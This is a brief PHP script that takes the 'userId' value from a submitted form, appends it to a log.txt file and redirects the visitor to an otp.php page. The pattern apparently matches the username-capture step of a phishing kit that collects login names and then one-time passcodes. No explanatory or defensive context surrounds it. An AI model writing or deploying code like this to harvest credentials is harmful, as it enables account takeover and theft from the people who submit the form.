<?php

    file_put_contents("log.txt", "Username: " . $_POST['userId'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
